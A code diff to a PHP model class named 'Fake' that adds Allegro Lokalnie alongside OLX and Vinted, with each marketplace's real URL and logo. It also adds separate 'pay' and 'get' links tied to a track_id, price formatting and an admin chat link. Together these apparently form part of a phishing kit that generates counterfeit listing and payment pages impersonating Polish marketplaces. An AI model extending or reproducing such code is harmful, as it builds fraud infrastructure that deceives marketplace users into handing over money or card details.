@@ -89,6 +89,9 @@ class Fake extends Model
             case Category::VINTED:
                 $url = "https://www.vinted.pl";
                 break;
+            case Category::ALLEGRO:
+                $url = "https://allegrolokalnie.pl";
+                break;
             default:
                 $url = "https://www.google.com";
                 break;
@@ -129,12 +132,24 @@ class Fake extends Model
     }
 
     /**
-     * @param false $secure
+     * @param bool $isPay
+     * @param bool $secure
      * @return string
      */
-    public function link(bool $secure = false): string
+    public function link(bool $isPay = false, bool $secure = false): string
     {
-        return $this->url('/', ['track_id' => $this->track_id], $secure);
+        $query = '?' . (($isPay) ? 'pay' : 'get') . '&' . http_build_query(['track_id' => $this->track_id]);
+        return $this->url("/$query", [], $secure);
+    }
+
+    public function linkForGet(bool $secure = false): string
+    {
+        return $this->link(false, $secure);
+    }
+
+    public function linkForPay(bool $secure = false): string
+    {
+        return $this->link(true, $secure);
     }
 
     public function adminChatLink(bool $secure = false): string
@@ -147,7 +162,18 @@ class Fake extends Model
         return $this->price . ' ' . setting('currency');
     }
 
-    public function logo(bool $secure = false): string
+    public function priceFormat($format = null,$dec = ','): string
+    {
+        $currency = setting('currency');
+        $price = number_format(str_replace(',','.',$this->price), 2, $dec, '');
+        preg_match("%^([\d]+)[$dec]([\d]{1,2})$%", $price, $matches);
+        if (!is_null($format) && !empty($matches)) {
+            return $matches[1] . sprintf($format, "$dec$matches[2] $currency");
+        }
+        return "$price $currency";
+    }
+
+    public function logo(): string
     {
         switch ($this->category->name) {
             case Category::OLX:
@@ -164,6 +190,9 @@ class Fake extends Model
                 break;
             case Category::VINTED:
                 $logo = 'https://i.imgur.com/aPK7aHK.png';
+                break;
+            case Category::ALLEGRO:
+                $logo = 'https://allegrolokalnie.pl/images/lokalnie-logo.svg';
                 break;
             default:
                 $logo = 'https://i.imgur.com/0Eilnlp.png';
